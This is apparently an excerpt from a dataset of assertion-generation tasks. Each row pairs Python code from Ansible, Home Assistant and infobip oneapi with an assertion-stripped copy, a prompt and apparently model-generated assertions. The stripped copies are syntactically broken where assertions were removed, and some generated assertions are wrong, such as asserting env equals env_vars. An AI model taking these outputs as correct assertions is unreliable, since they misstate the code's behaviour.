 [39, 'train_path', '!=', None, 'the train_path should not be None'],
 [40, 'test_path', '!=', None, 'the test_path should not be None'],
 [47, 'opener', '!=', None, 'the opener should not be None'],
 [52, 'archive_path', '!=', None, 'the archive_path should not be None after extraction'],
 [53, 'sentiment140_path', '!=', None, 'the sentiment140_path should not be None after extraction'],
 [59, 'datasets_folder', '!=', None, 'the datasets_folder should not be None after function call']
]"
felixfontein/ansible,"#!/usr/bin/env python

import io
import os
import sys

import pexpect


env_vars = {
    'ANSIBLE_NOCOLOR': 'True',
    'ANSIBLE_RETRY_FILES_ENABLED': 'False',
}

env = os.environ.copy()
env.update(env_vars)

with io.BytesIO() as logfile:
    debugger_test_test = pexpect.spawn(
        'ansible-playbook',
        args=['test_run_once_playbook.yml'] + sys.argv[1:],
        timeout=10,
        env=env
    )

    debugger_test_test.logfile = logfile

    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
    debugger_test_test.send('task.args[""that""] = ""true""\r')
    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
    debugger_test_test.send('r\r')
    debugger_test_test.expect(pexpect.EOF)
    debugger_test_test.close()

    assert str(logfile.getvalue()).count('Task 2 executed') == 2
","
1#!/usr/bin/env python
2
3import io
4import os
5import sys
6
7import pexpect
8
9
10env_vars = {
11    'ANSIBLE_NOCOLOR': 'True',
12    'ANSIBLE_RETRY_FILES_ENABLED': 'False',
13}
14
15env = os.environ.copy()
16env.update(env_vars)
17
18with io.BytesIO() as logfile:
19    debugger_test_test = pexpect.spawn(
20        'ansible-playbook',
21        args=['test_run_once_playbook.yml'] + sys.argv[1:],
22        timeout=10,
23        env=env
24    )
25
26    debugger_test_test.logfile = logfile
27
28    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
29    debugger_test_test.send('task.args[""that""] = ""true""\r')
30    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
31    debugger_test_test.send('r\r')
32    debugger_test_test.expect(pexpect.EOF)
33    debugger_test_test.close()
34
35","[[""str(logfile.getvalue()).count('Task 2 executed')"", '==', '2']]",1,1,1.0,0.001233045622688,"['env_vars', 'env', 'debugger_test_test', 'debugger_test_test.logfile', 'debugger_test_test.send(\'task.args[""that""]']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['env_vars', 'env', 'debugger_test_test', 'debugger_test_test.logfile', 'debugger_test_test.send(\'task.args[""that""]']
*Code:

1#!/usr/bin/env python
2
3import io
4import os
5import sys
6
7import pexpect
8
9
10env_vars = {
11    'ANSIBLE_NOCOLOR': 'True',
12    'ANSIBLE_RETRY_FILES_ENABLED': 'False',
13}
14
15env = os.environ.copy()
16env.update(env_vars)
17
18with io.BytesIO() as logfile:
19    debugger_test_test = pexpect.spawn(
20        'ansible-playbook',
21        args=['test_run_once_playbook.yml'] + sys.argv[1:],
22        timeout=10,
23        env=env
24    )
25
26    debugger_test_test.logfile = logfile
27
28    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
29    debugger_test_test.send('task.args[""that""] = ""true""\r')
30    debugger_test_test.expect_exact('TASK: Task 1 (debug)> ')
31    debugger_test_test.send('r\r')
32    debugger_test_test.expect(pexpect.EOF)
33    debugger_test_test.close()
34
35",2306,"[[15, 'env', '==', 'env_vars', ""env should be an extension of env_vars""], [26, 'debugger_test_test.logfile', '!=', 0, ""logfile should not be empty after debugger_test_test is run""], [28, 'debugger_test_test', '!=', 0, ""debugger_test_test should not be empty after expecting 'TASK: Task 1 (debug)> '""], [30, 'debugger_test_test', '!=', 0, ""debugger_test_test should not be empty after sending 'task.args[\""that\""] = \""true\""\\r'""],  [32, 'debugger_test_test', '!=', 0, ""debugger_test_test should not be empty after expecting pexpect.EOF""]]"
rohitranjan1991/home-assistant,"""""""Test the Z-Wave JS number platform.""""""
from zwave_js_server.event import Event

from homeassistant.const import STATE_UNKNOWN
from homeassistant.helpers import entity_registry as er

from .common import BASIC_NUMBER_ENTITY

NUMBER_ENTITY = ""number.thermostat_hvac_valve_control""
VOLUME_NUMBER_ENTITY = ""number.indoor_siren_6_default_volume_2""


async def test_number(hass, client, aeotec_radiator_thermostat, integration):
    """"""Test the number entity.""""""
    node = aeotec_radiator_thermostat
    state = hass.states.get(NUMBER_ENTITY)

    assert state
    assert state.state == ""75.0""

    # Test turn on setting value
    await hass.services.async_call(
        ""number"",
        ""set_value"",
        {""entity_id"": NUMBER_ENTITY, ""value"": 30},
        blocking=True,
    )

    assert len(client.async_send_command.call_args_list) == 1
    args = client.async_send_command.call_args[0][0]
    assert args[""command""] == ""node.set_value""
    assert args[""nodeId""] == 4
    assert args[""valueId""] == {
        ""commandClassName"": ""Multilevel Switch"",
        ""commandClass"": 38,
        ""ccVersion"": 1,
        ""endpoint"": 0,
        ""property"": ""targetValue"",
        ""propertyName"": ""targetValue"",
        ""metadata"": {
            ""label"": ""Target value"",
            ""max"": 99,
            ""min"": 0,
            ""type"": ""number"",
            ""readable"": True,
            ""writeable"": True,
            ""label"": ""Target value"",
        },
    }
    assert args[""value""] == 30.0

    client.async_send_command.reset_mock()

    # Test value update from value updated event
    event = Event(
        type=""value updated"",
        data={
            ""source"": ""node"",
            ""event"": ""value updated"",
            ""nodeId"": 4,
            ""args"": {
                ""commandClassName"": ""Multilevel Switch"",
                ""commandClass"": 38,
                ""endpoint"": 0,
                ""property"": ""currentValue"",
                ""newValue"": 99,
                ""prevValue"": 0,
                ""propertyName"": ""currentValue"",
            },
        },
    )
    node.receive_event(event)

    state = hass.states.get(NUMBER_ENTITY)
    assert state.state == ""99.0""


async def test_volume_number(hass, client, aeotec_zw164_siren, integration):
    """"""Test the volume number entity.""""""
    node = aeotec_zw164_siren
    state = hass.states.get(VOLUME_NUMBER_ENTITY)

    assert state
    assert state.state == ""1.0""
    assert state.attributes[""step""] == 0.01
    assert state.attributes[""max""] == 1.0
    assert state.attributes[""min""] == 0

    # Test turn on setting value
    await hass.services.async_call(
        ""number"",
        ""set_value"",
        {""entity_id"": VOLUME_NUMBER_ENTITY, ""value"": 0.3},
        blocking=True,
    )

    assert len(client.async_send_command.call_args_list) == 1
    args = client.async_send_command.call_args[0][0]
    assert args[""command""] == ""node.set_value""
    assert args[""nodeId""] == node.node_id
    assert args[""valueId""] == {
        ""endpoint"": 2,
        ""commandClass"": 121,
        ""commandClassName"": ""Sound Switch"",
        ""property"": ""defaultVolume"",
        ""propertyName"": ""defaultVolume"",
        ""ccVersion"": 1,
        ""metadata"": {
            ""type"": ""number"",
            ""readable"": True,
            ""writeable"": True,
            ""label"": ""Default volume"",
            ""min"": 0,
            ""max"": 100,
            ""unit"": ""%"",
        },
        ""value"": 100,
    }
    assert args[""value""] == 30

    client.async_send_command.reset_mock()

    # Test value update from value updated event
    event = Event(
        type=""value updated"",
        data={
            ""source"": ""node"",
            ""event"": ""value updated"",
            ""nodeId"": 4,
            ""args"": {
                ""commandClassName"": ""Sound Switch"",
                ""commandClass"": 121,
                ""endpoint"": 2,
                ""property"": ""defaultVolume"",
                ""newValue"": 30,
                ""prevValue"": 100,
                ""propertyName"": ""defaultVolume"",
            },
        },
    )
    node.receive_event(event)

    state = hass.states.get(VOLUME_NUMBER_ENTITY)
    assert state.state == ""0.3""

    # Test null value
    event = Event(
        type=""value updated"",
        data={
            ""source"": ""node"",
            ""event"": ""value updated"",
            ""nodeId"": 4,
            ""args"": {
                ""commandClassName"": ""Sound Switch"",
                ""commandClass"": 121,
                ""endpoint"": 2,
                ""property"": ""defaultVolume"",
                ""newValue"": None,
                ""prevValue"": 30,
                ""propertyName"": ""defaultVolume"",
            },
        },
    )
    node.receive_event(event)

    state = hass.states.get(VOLUME_NUMBER_ENTITY)
    assert state.state == STATE_UNKNOWN


async def test_disabled_basic_number(hass, ge_in_wall_dimmer_switch, integration):
    """"""Test number is created from Basic CC and is disabled.""""""
    ent_reg = er.async_get(hass)
    entity_entry = ent_reg.async_get(BASIC_NUMBER_ENTITY)

    assert entity_entry
    assert entity_entry.disabled
    assert entity_entry.disabled_by is er.RegistryEntryDisabler.INTEGRATION
","
1""""""Test the Z-Wave JS number platform.""""""
2from zwave_js_server.event import Event
3
4from homeassistant.const import STATE_UNKNOWN
5from homeassistant.helpers import entity_registry as er
6
7from .common import BASIC_NUMBER_ENTITY
8
9NUMBER_ENTITY = ""number.thermostat_hvac_valve_control""
10VOLUME_NUMBER_ENTITY = ""number.indoor_siren_6_default_volume_2""
11
12
13async def test_number(hass, client, aeotec_radiator_thermostat, integration):
14    """"""Test the number entity.""""""
15    node = aeotec_radiator_thermostat
16    state = hass.states.get(NUMBER_ENTITY)
17
18
19    # Test turn on setting value
20    await hass.services.async_call(
21        ""number"",
22        ""set_value"",
23        {""entity_id"": NUMBER_ENTITY, ""value"": 30},
24        blocking=True,
25    )
26
27    args = client.async_send_command.call_args[0][0]
28        ""commandClassName"": ""Multilevel Switch"",
29        ""commandClass"": 38,
30        ""ccVersion"": 1,
31        ""endpoint"": 0,
32        ""property"": ""targetValue"",
33        ""propertyName"": ""targetValue"",
34        ""metadata"": {
35            ""label"": ""Target value"",
36            ""max"": 99,
37            ""min"": 0,
38            ""type"": ""number"",
39            ""readable"": True,
40            ""writeable"": True,
41            ""label"": ""Target value"",
42        },
43    }
44
45    client.async_send_command.reset_mock()
46
47    # Test value update from value updated event
48    event = Event(
49        type=""value updated"",
50        data={
51            ""source"": ""node"",
52            ""event"": ""value updated"",
53            ""nodeId"": 4,
54            ""args"": {
55                ""commandClassName"": ""Multilevel Switch"",
56                ""commandClass"": 38,
57                ""endpoint"": 0,
58                ""property"": ""currentValue"",
59                ""newValue"": 99,
60                ""prevValue"": 0,
61                ""propertyName"": ""currentValue"",
62            },
63        },
64    )
65    node.receive_event(event)
66
67    state = hass.states.get(NUMBER_ENTITY)
68
69
70async def test_volume_number(hass, client, aeotec_zw164_siren, integration):
71    """"""Test the volume number entity.""""""
72    node = aeotec_zw164_siren
73    state = hass.states.get(VOLUME_NUMBER_ENTITY)
74
75
76    # Test turn on setting value
77    await hass.services.async_call(
78        ""number"",
79        ""set_value"",
80        {""entity_id"": VOLUME_NUMBER_ENTITY, ""value"": 0.3},
81        blocking=True,
82    )
83
84    args = client.async_send_command.call_args[0][0]
85        ""endpoint"": 2,
86        ""commandClass"": 121,
87        ""commandClassName"": ""Sound Switch"",
88        ""property"": ""defaultVolume"",
89        ""propertyName"": ""defaultVolume"",
90        ""ccVersion"": 1,
91        ""metadata"": {
92            ""type"": ""number"",
93            ""readable"": True,
94            ""writeable"": True,
95            ""label"": ""Default volume"",
96            ""min"": 0,
97            ""max"": 100,
98            ""unit"": ""%"",
99        },
100        ""value"": 100,
101    }
102
103    client.async_send_command.reset_mock()
104
105    # Test value update from value updated event
106    event = Event(
107        type=""value updated"",
108        data={
109            ""source"": ""node"",
110            ""event"": ""value updated"",
111            ""nodeId"": 4,
112            ""args"": {
113                ""commandClassName"": ""Sound Switch"",
114                ""commandClass"": 121,
115                ""endpoint"": 2,
116                ""property"": ""defaultVolume"",
117                ""newValue"": 30,
118                ""prevValue"": 100,
119                ""propertyName"": ""defaultVolume"",
120            },
121        },
122    )
123    node.receive_event(event)
124
125    state = hass.states.get(VOLUME_NUMBER_ENTITY)
126
127    # Test null value
128    event = Event(
129        type=""value updated"",
130        data={
131            ""source"": ""node"",
132            ""event"": ""value updated"",
133            ""nodeId"": 4,
134            ""args"": {
135                ""commandClassName"": ""Sound Switch"",
136                ""commandClass"": 121,
137                ""endpoint"": 2,
138                ""property"": ""defaultVolume"",
139                ""newValue"": None,
140                ""prevValue"": 30,
141                ""propertyName"": ""defaultVolume"",
142            },
143        },
144    )
145    node.receive_event(event)
146
147    state = hass.states.get(VOLUME_NUMBER_ENTITY)
148
149
150async def test_disabled_basic_number(hass, ge_in_wall_dimmer_switch, integration):
151    """"""Test number is created from Basic CC and is disabled.""""""
152    ent_reg = er.async_get(hass)
153    entity_entry = ent_reg.async_get(BASIC_NUMBER_ENTITY)
154
155","[['state', '==', 'True'], ['state.state', '==', '""75.0""'], ['len(client.async_send_comm', '==', 'True'], ['.call_args_list)', '==', '1'], ['args[""comm', '==', 'True'], ['""]', '==', '""node.set_value""'], ['args[""nodeId""]', '==', '4'], ['args[""valueId""]', '==', '{'], ['args[""value""]', '==', '30.0'], ['state.state', '==', '""99.0""'], ['state', '==', 'True'], ['state.state', '==', '""1.0""'], ['state.attributes[""step""]', '==', '0.01'], ['state.attributes[""max""]', '==', '1.0'], ['state.attributes[""min""]', '==', '0'], ['len(client.async_send_comm', '==', 'True'], ['.call_args_list)', '==', '1'], ['args[""comm', '==', 'True'], ['""]', '==', '""node.set_value""'], ['args[""nodeId""]', '==', 'node.node_id'], ['args[""valueId""]', '==', '{'], ['args[""value""]', '==', '30'], ['state.state', '==', '""0.3""'], ['state.state', '==', 'STATE_UNKNOWN'], ['entity_entry', '==', 'True'], ['entity_entry.disabled', '==', 'True'], ['entity_entry.disabled_by', '==', 'er.RegistryEntryDisabler.INTEGRATION']]",23,27,1.173913043478261,0.0052043176561295,"['NUMBER_ENTITY', 'VOLUME_NUMBER_ENTITY', 'hass', 'client', 'aeotec_radiator_thermostat', 'integration', 'node', 'state', 'args', 'event', 'aeotec_zw164_siren', 'ge_in_wall_dimmer_switch', 'ent_reg', 'entity_entry']",14,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['NUMBER_ENTITY', 'VOLUME_NUMBER_ENTITY', 'hass', 'client', 'aeotec_radiator_thermostat', 'integration', 'node', 'state', 'args', 'event', 'aeotec_zw164_siren', 'ge_in_wall_dimmer_switch', 'ent_reg', 'entity_entry']
*Code:

1""""""Test the Z-Wave JS number platform.""""""
2from zwave_js_server.event import Event
3
4from homeassistant.const import STATE_UNKNOWN
5from homeassistant.helpers import entity_registry as er
6
7from .common import BASIC_NUMBER_ENTITY
8
9NUMBER_ENTITY = ""number.thermostat_hvac_valve_control""
10VOLUME_NUMBER_ENTITY = ""number.indoor_siren_6_default_volume_2""
11
12
13async def test_number(hass, client, aeotec_radiator_thermostat, integration):
14    """"""Test the number entity.""""""
15    node = aeotec_radiator_thermostat
16    state = hass.states.get(NUMBER_ENTITY)
17
18
19    # Test turn on setting value
20    await hass.services.async_call(
21        ""number"",
22        ""set_value"",
23        {""entity_id"": NUMBER_ENTITY, ""value"": 30},
24        blocking=True,
25    )
26
27    args = client.async_send_command.call_args[0][0]
28        ""commandClassName"": ""Multilevel Switch"",
29        ""commandClass"": 38,
30        ""ccVersion"": 1,
31        ""endpoint"": 0,
32        ""property"": ""targetValue"",
33        ""propertyName"": ""targetValue"",
34        ""metadata"": {
35            ""label"": ""Target value"",
36            ""max"": 99,
37            ""min"": 0,
38            ""type"": ""number"",
39            ""readable"": True,
40            ""writeable"": True,
41            ""label"": ""Target value"",
42        },
43    }
44
45    client.async_send_command.reset_mock()
46
47    # Test value update from value updated event
48    event = Event(
49        type=""value updated"",
50        data={
51            ""source"": ""node"",
52            ""event"": ""value updated"",
53            ""nodeId"": 4,
54            ""args"": {
55                ""commandClassName"": ""Multilevel Switch"",
56                ""commandClass"": 38,
57                ""endpoint"": 0,
58                ""property"": ""currentValue"",
59                ""newValue"": 99,
60                ""prevValue"": 0,
61                ""propertyName"": ""currentValue"",
62            },
63        },
64    )
65    node.receive_event(event)
66
67    state = hass.states.get(NUMBER_ENTITY)
68
69
70async def test_volume_number(hass, client, aeotec_zw164_siren, integration):
71    """"""Test the volume number entity.""""""
72    node = aeotec_zw164_siren
73    state = hass.states.get(VOLUME_NUMBER_ENTITY)
74
75
76    # Test turn on setting value
77    await hass.services.async_call(
78        ""number"",
79        ""set_value"",
80        {""entity_id"": VOLUME_NUMBER_ENTITY, ""value"": 0.3},
81        blocking=True,
82    )
83
84    args = client.async_send_command.call_args[0][0]
85        ""endpoint"": 2,
86        ""commandClass"": 121,
87        ""commandClassName"": ""Sound Switch"",
88        ""property"": ""defaultVolume"",
89        ""propertyName"": ""defaultVolume"",
90        ""ccVersion"": 1,
91        ""metadata"": {
92            ""type"": ""number"",
93            ""readable"": True,
94            ""writeable"": True,
95            ""label"": ""Default volume"",
96            ""min"": 0,
97            ""max"": 100,
98            ""unit"": ""%"",
99        },
100        ""value"": 100,
101    }
102
103    client.async_send_command.reset_mock()
104
105    # Test value update from value updated event
106    event = Event(
107        type=""value updated"",
108        data={
109            ""source"": ""node"",
110            ""event"": ""value updated"",
111            ""nodeId"": 4,
112            ""args"": {
113                ""commandClassName"": ""Sound Switch"",
114                ""commandClass"": 121,
115                ""endpoint"": 2,
116                ""property"": ""defaultVolume"",
117                ""newValue"": 30,
118                ""prevValue"": 100,
119                ""propertyName"": ""defaultVolume"",
120            },
121        },
122    )
123    node.receive_event(event)
124
125    state = hass.states.get(VOLUME_NUMBER_ENTITY)
126
127    # Test null value
128    event = Event(
129        type=""value updated"",
130        data={
131            ""source"": ""node"",
132            ""event"": ""value updated"",
133            ""nodeId"": 4,
134            ""args"": {
135                ""commandClassName"": ""Sound Switch"",
136                ""commandClass"": 121,
137                ""endpoint"": 2,
138                ""property"": ""defaultVolume"",
139                ""newValue"": None,
140                ""prevValue"": 30,
141                ""propertyName"": ""defaultVolume"",
142            },
143        },
144    )
145    node.receive_event(event)
146
147    state = hass.states.get(VOLUME_NUMBER_ENTITY)
148
149
150async def test_disabled_basic_number(hass, ge_in_wall_dimmer_switch, integration):
151    """"""Test number is created from Basic CC and is disabled.""""""
152    ent_reg = er.async_get(hass)
153    entity_entry = ent_reg.async_get(BASIC_NUMBER_ENTITY)
154
155",6259,"[[14, 'hass', '!=', None, ""hass variable must be initialized for function 'test_number'""],
[14, 'client', '!=', None, ""client variable must be initialized for function 'test_number'""],
[14, 'aeotec_radiator_thermostat', '!=', None, ""aeotec_radiator_thermostat variable must be initialized for function 'test_number'""],
[27, 'args', '!=', None, ""args variable must be initialized after async_call method""],
[67, 'state', '!=', None, ""state variable must have value after getting NUMBER_ENTITY state""],
[70, 'hass', '!=', None, ""hass variable must be initialized for function 'test_volume_number'""],
[70, 'client', '!=', None, ""client variable must be initialized for function 'test_volume_number'""],
[70, 'aeotec_zw164_siren', '!=', None, ""aeotec_zw164_siren variable must be initialized for function 'test_volume_number'""],
[84, 'args', '!=', None, ""args variable must be initialized after async_call method""],
[125, 'state', '!=', None, ""state variable must have value after getting VOLUME_NUMBER_ENTITY state""],
[147, 'state', '!=', None, ""state variable must have value after getting VOLUME_NUMBER_ENTITY state""],
[150, 'hass', '!=', None, ""hass variable must be initialized for function 'test_disabled_basic_number'""],
[150, 'ge_in_wall_dimmer_switch', '!=', None, ""ge_in_wall_dimmer_switch variable must be initialized for function 'test_disabled_basic_number'""],
[153, 'ent_reg', '!=', None, ""ent_reg variable must be initialized after async_get method""],
[154, 'entity_entry', '!=', None, ""entity_entry variable must have value after getting BASIC_NUMBER_ENTITY state""]]"
infobip/oneapi-python,"# -*- coding: utf-8 -*-

import pdb

import logging as mod_logging
import json as mod_json

import oneapi.utils as mod_utils

class FieldConverter:

    def __init__(self, json_field_name=None):
        self.json_field_name = json_field_name

        # Filled later while registering the model:
        self.object_field_name = None

    def from_json(self, value):
        return value

    def to_json(self, value):
        return value

class GetPartsOfUrlFieldConverter(FieldConverter):

    def __init__(self, json_field_name=None, where=-1):
        FieldConverter.__init__(self, json_field_name=json_field_name)
        self.where = where

    def from_json(self, value):
        if value == None:
            return None

        parts = value.split('/')

        if ((self.where >= 0 and self.where < len(parts)) or  (self.where < 0 and -self.where > len(parts))):
                return None

        return parts[self.where]

    def to_json(self, value):
        return value

class ObjectFieldConverter(FieldConverter):

    def __init__(self, classs, json_field_name=None):
        FieldConverter.__init__(self, json_field_name=json_field_name)
        self.classs = classs

    def from_json(self, value):
        if value == None:
            return None

        return Conversions.from_json(self.classs, value, is_error=False)

    def to_json(self, value):
        return Conversions.to_json(value)

class ObjectsListFieldConverter(FieldConverter):

    def __init__(self, classs, json_field_name=None):
        FieldConverter.__init__(self, json_field_name=json_field_name)
        self.classs = classs

    def from_json(self, values):
        if not values:
            return []

        result = []

        for value in values:
            result.append(Conversions.from_json(self.classs, value, is_error=False))

        return result

    def to_json(self, value):
        # TODO
        pass

# ----------------------------------------------------------------------------------------------------

class Models:

    models = []

    @staticmethod
    def register(model_class):
        """""" Registers metadata for object<->JSON conversion """"""
        assert model_class

        Models.models.append(model_class)
        for attribute_name in dir(model_class):
            if '_' != attribute_name[0]:
                attribute_values = getattr(model_class, attribute_name)
                if not isinstance(attribute_values, list):
                    attribute_values = [attribute_values]

                for attribute_value in attribute_values:
                    if isinstance(attribute_value, FieldConverter):
                        if not attribute_value.json_field_name:
                            attribute_value.json_field_name = attribute_name
                        if not attribute_value.object_field_name:
                            attribute_value.object_field_name = attribute_name
                        attribute_value.object_field_name = attribute_name

    @staticmethod
    def is_registered(model_class):
        return model_class in Models.models

# ----------------------------------------------------------------------------------------------------

class Conversions:

    @staticmethod
    def fill_from_json(obj, json, is_error=False):
        """""" Fill existing objects with JSON data. """"""
        assert obj

        import oneapi.models as mod_models

        if isinstance(json, str) or isinstance(json, unicode):
            json = mod_json.loads(json)

        assert isinstance(json, dict)

        if is_error:
            obj.exception = Conversions.from_json(mod_models.OneApiError, json, False)
            assert not obj.is_success()
        else:
            for attribute_name in dir(obj.__class__):
                attribute_value = getattr(obj.__class__, attribute_name)
                object_field_name = None
                converted = None
                if isinstance(attribute_value, FieldConverter):
                    object_field_name = attribute_value.object_field_name
                    json_field_name = attribute_value.json_field_name
                    json_value = mod_utils.get(json, json_field_name)
                    converted = attribute_value.from_json(json_value)

                    if object_field_name:
                        if isinstance(converted, unicode):
                            converted = converted.encode('utf-8')
                        setattr(obj, object_field_name, converted)

        return obj

    @staticmethod
    def from_json(classs, json, is_error=False):
        """""" Create a new object converted from JSON data. """"""
        assert classs

        if isinstance(json, str) or isinstance(json, unicode):
            json = mod_json.loads(json)

        assert isinstance(json, dict)

        result = classs()

        Conversions.fill_from_json(result, json, is_error)

        return result

    @staticmethod
    def to_json(obj):
        assert obj

        pass

# ----------------------------------------------------------------------------------------------------

class AbstractModel:

    exception = None

    def __init__(self):
        if not Models.is_registered(self.__class__):
            Models.register(self.__class__)

        # reset class attributes for this instance:
        for class_attribute in dir(self.__class__):
            class_attribute_value = getattr(self.__class__, class_attribute)
            if isinstance(class_attribute_value, FieldConverter):
                setattr(self, class_attribute, None)

    def is_success(self):
        return self.exception == None

    def __str__(self):
        result = '[{0}:'.format(self.__class__.__name__)

        for attr in dir(self):
            value = getattr(self, attr)
            if '_' != attr[0] and not callable(value):
                result += ':{0}={1}'.format(attr, value)

        return result + ']'

","
1# -*- coding: utf-8 -*-
2
3import pdb
4
5import logging as mod_logging
6import json as mod_json
7
8import oneapi.utils as mod_utils
9
10class FieldConverter:
11
12    def __init__(self, json_field_name=None):
13        self.json_field_name = json_field_name
14
15        # Filled later while registering the model:
16        self.object_field_name = None
17
18    def from_json(self, value):
19        return value
20
21    def to_json(self, value):
22        return value
23
24class GetPartsOfUrlFieldConverter(FieldConverter):
25
26    def __init__(self, json_field_name=None, where=-1):
27        FieldConverter.__init__(self, json_field_name=json_field_name)
28        self.where = where
29
30    def from_json(self, value):
31        if value == None:
32            return None
33
34        parts = value.split('/')
35
36        if ((self.where >= 0 and self.where < len(parts)) or  (self.where < 0 and -self.where > len(parts))):
37                return None
38
39        return parts[self.where]
40
41    def to_json(self, value):
42        return value
43
44class ObjectFieldConverter(FieldConverter):
45
46    def __init__(self, classs, json_field_name=None):
47        FieldConverter.__init__(self, json_field_name=json_field_name)
48        self.classs = classs
49
50    def from_json(self, value):
51        if value == None:
52            return None
53
54        return Conversions.from_json(self.classs, value, is_error=False)
55
56    def to_json(self, value):
57        return Conversions.to_json(value)
58
59class ObjectsListFieldConverter(FieldConverter):
60
61    def __init__(self, classs, json_field_name=None):
62        FieldConverter.__init__(self, json_field_name=json_field_name)
63        self.classs = classs
64
65    def from_json(self, values):
66        if not values:
67            return []
68
69        result = []
70
71        for value in values:
72            result.append(Conversions.from_json(self.classs, value, is_error=False))
73
74        return result
75
76    def to_json(self, value):
77        # TODO
78        pass
79
80# ----------------------------------------------------------------------------------------------------
81
82class Models:
83
84    models = []
85
86    @staticmethod
87    def register(model_class):
88        """""" Registers metadata for object<->JSON conversion """"""
89
90        Models.models.append(model_class)
91        for attribute_name in dir(model_class):
92            if '_' != attribute_name[0]:
93                attribute_values = getattr(model_class, attribute_name)
94                if not isinstance(attribute_values, list):
95                    attribute_values = [attribute_values]
96
97                for attribute_value in attribute_values:
98                    if isinstance(attribute_value, FieldConverter):
99                        if not attribute_value.json_field_name:
100                            attribute_value.json_field_name = attribute_name
101                        if not attribute_value.object_field_name:
102                            attribute_value.object_field_name = attribute_name
103                        attribute_value.object_field_name = attribute_name
104
105    @staticmethod
106    def is_registered(model_class):
107        return model_class in Models.models
108
109# ----------------------------------------------------------------------------------------------------
110
111class Conversions:
112
113    @staticmethod
114    def fill_from_json(obj, json, is_error=False):
115        """""" Fill existing objects with JSON data. """"""
116
117        import oneapi.models as mod_models
118
119        if isinstance(json, str) or isinstance(json, unicode):
120            json = mod_json.loads(json)
121
122
123        if is_error:
124            obj.exception = Conversions.from_json(mod_models.OneApiError, json, False)
125        else:
126            for attribute_name in dir(obj.__class__):
127                attribute_value = getattr(obj.__class__, attribute_name)
128                object_field_name = None
129                converted = None
130                if isinstance(attribute_value, FieldConverter):
131                    object_field_name = attribute_value.object_field_name
132                    json_field_name = attribute_value.json_field_name
133                    json_value = mod_utils.get(json, json_field_name)
134                    converted = attribute_value.from_json(json_value)
135
136                    if object_field_name:
137                        if isinstance(converted, unicode):
138                            converted = converted.encode('utf-8')
139                        setattr(obj, object_field_name, converted)
140
141        return obj
142
143    @staticmethod
144    def from_json(classs, json, is_error=False):
145        """""" Create a new object converted from JSON data. """"""
146
147        if isinstance(json, str) or isinstance(json, unicode):
148            json = mod_json.loads(json)
149
150
151        result = classs()
152
153        Conversions.fill_from_json(result, json, is_error)
154
155        return result
156
157    @staticmethod
158    def to_json(obj):
159
160        pass
161
162# ----------------------------------------------------------------------------------------------------
163
164class AbstractModel:
165
166    exception = None
167
168    def __init__(self):
169        if not Models.is_registered(self.__class__):
170            Models.register(self.__class__)
171
172        # reset class attributes for this instance:
173        for class_attribute in dir(self.__class__):
174            class_attribute_value = getattr(self.__class__, class_attribute)
175            if isinstance(class_attribute_value, FieldConverter):
176                setattr(self, class_attribute, None)
177
178    def is_success(self):
179        return self.exception == None
180
181    def __str__(self):
182        result = '[{0}:'.format(self.__class__.__name__)
183
184        for attr in dir(self):
185            value = getattr(self, attr)
186            if '_' != attr[0] and not callable(value):
187                result += ':{0}={1}'.format(attr, value)
188
189        return result + ']'
190
191","[['model_class', '==', 'True'], ['obj', '==', 'True'], ['obj.is_success()', '==', 'False'], ['classs', '==', 'True'], ['obj', '==', 'True']]",7,5,0.7142857142857143,0.0008424599831508,"['json_field_name', 'self.json_field_name', 'self.object_field_name', 'value', 'where', 'self.where', 'parts', 'classs', 'self.classs', 'values', 'result', 'models', 'model_class', 'attribute_values', 'attribute_value.json_field_name', 'attribute_value.object_field_name', 'obj', 'json', 'is_error', 'obj.exception', 'attribute_value', 'object_field_name', 'converted', 'json_value', 'exception', 'class_attribute_value']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
